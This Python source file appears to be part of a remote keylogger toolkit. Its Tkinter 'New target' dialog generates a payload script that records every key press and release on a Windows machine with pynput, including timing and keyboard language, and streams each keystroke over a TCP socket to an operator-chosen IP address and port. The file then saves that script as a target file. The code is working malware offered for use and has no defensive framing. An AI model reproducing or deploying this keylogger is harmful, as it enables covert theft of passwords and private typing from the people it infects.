import os
import random
import re
import socket
from tkinter.ttk import *
from tkinter.filedialog import asksaveasfile
from tkinter.messagebox import askyesno
from tkinter import Toplevel, BooleanVar


def New_Target(**kwargs):
    main_app = Toplevel(**kwargs)
    main_app.title('New target')

    def payload(ip, port):
        return r"""import ctypes
import socket
from pynput.keyboard import Key
from pynput import keyboard
import time

class Timer:
    def start(self):self.start_count = time.time()
    def stop(self):self.end_count = time.time()
    def get(self):return "%.4f" % (self.end_count - self.start_count)

REMOTE_HOST = 'PAYLOAD_IP_ADDRESS'
REMOTE_PORT = PAYLOAD_PORT_NUMBER
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def Shell_Send(data):
    conn.send(data.encode())

conn.connect((REMOTE_HOST, REMOTE_PORT))

def get_keyboard_language_id():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    return user32.GetKeyboardLayout(user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), 0)) & (2 ** 16 - 1)

class Holded:
    shift = False
    # ctrl = False
KeyboardisReleased_timer = True
keyboard_timer = Timer()

def Pressed(key):
    global KeyboardisReleased_timer
    global data

    if KeyboardisReleased_timer:
        keyboard_timer.start()
        KeyboardisReleased_timer = False
    try:
        key = str(key.char).upper() if Holded.shift else str(key.char)
    except (AttributeError, TypeError):
        key = str(key).upper() if Holded.shift else str(key)
    key += '\\' if key == '\\' else ''
    Shell_Send('{"key": \"%s%s\", "action": "Press", "for": "-", "language": %i}' % ("\\" if key == '"' else '', key, get_keyboard_language_id()))

    if key is Key.shift:
        Holded.shift = True
def Released(key):
    global KeyboardisReleased_timer

    keyboard_timer.stop()
    try:
        key = str(key.char).upper() if Holded.shift else str(key.char)
    except (AttributeError, TypeError):
        key = str(key).upper() if Holded.shift else str(key)
    key += '\\' if key == '\\' else ''
    Shell_Send('{"key": \"%s%s\", "action": "Release", "for": "%s", "language": %i}' % ("\\" if key == '"' else '', key, keyboard_timer.get(), get_keyboard_language_id()))
    if key is Key.shift:
        Holded.shift = False
    KeyboardisReleased_timer = True
with keyboard.Listener(on_press=Pressed, on_release=Released) as vl:
    vl.join()""".replace('PAYLOAD_IP_ADDRESS', ip).replace('PAYLOAD_PORT_NUMBER', port)

    main_frame = Frame(main_app)
    main_frame.pack(fill='both', expand=True, padx=25, pady=25)

    Label(main_frame, text='Target name:').grid(row=0, column=0)
    _TARGET_ = Entry(main_frame)
    _TARGET_.grid(row=0, column=1, columnspan=4, sticky='ew', pady=5)
    Label(main_frame, text='.py').grid(row=0, column=5)

    Label(main_frame, text='Address:').grid(row=1, column=0)

    def port_VALIDATOR(event):
        # IR = IP REGEX
        IR = re.compile('(^\d{0,5}$)')
        if IR.match(event):
            return True
        else:
            return False

    register_port = main_app.register(port_VALIDATOR)
    _PORT_ = Entry(main_frame, width=5, validate="key", validatecommand=(register_port, '%P'))
    _PORT_.grid(row=1, column=4)
    _PORT_.insert(0, str(random.randint(1, 65535)))
    Label(main_frame, text=':').grid(row=1, column=3)

    def IP_VALIDATOR(event):
        # IR = IP REGEX
        IR = re.compile(
            '(^\d{0,3}$|^\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{0,3}$)')
        if IR.match(event):
            return True
        else:
            return False

    register_ip = main_app.register(IP_VALIDATOR)
    _IP_ = Entry(main_frame, width=14, validate="key", validatecommand=(register_ip, '%P'))
    _IP_.grid(row=1, column=2)
    _IP_.insert(0, socket.gethostbyname(socket.gethostname()))

    Label(main_frame).grid(row=2, column=0)
    isCurrent_pathVar = BooleanVar(value=False)
    isCurrent_path = Checkbutton(main_frame, text='Current path', variable=isCurrent_pathVar, takefocus=False)
    isCurrent_path.grid(row=3, column=0)

    Label(main_frame).grid(row=5, column=0)

    def Do_Make():
        if _TARGET_.get() and _IP_.get() and _PORT_.get():
            if isCurrent_pathVar.get():
                filename = _TARGET_.get() + '.py'
                if os.path.exists(filename):
                    answer = askyesno(title='Overwrite?',
                                      message='%s is exists at %s (overwrite it?)' % (filename, os.curdir),
                                      icon='warning')
                    if answer:
                        open(filename, 'w').write(payload(ip=_IP_.get(), port=_PORT_.get()))
                else:
                    open(filename, 'w').write(payload(ip=_IP_.get(), port=_PORT_.get()))
            else:
                filename = asksaveasfile(initialfile=_TARGET_.get(), defaultextension='py', confirmoverwrite=True,
                                         title='Save target script as:')
                if filename:
                    open(filename.name, 'w').write(payload(ip=_IP_.get(), port=_PORT_.get()))

    Make = Button(main_frame, text='Make', takefocus=False, cursor='hand2', command=lambda: Do_Make())
    Make.grid(row=6, column=0, columnspan=6, sticky='ew')

    # main_app.mainloop()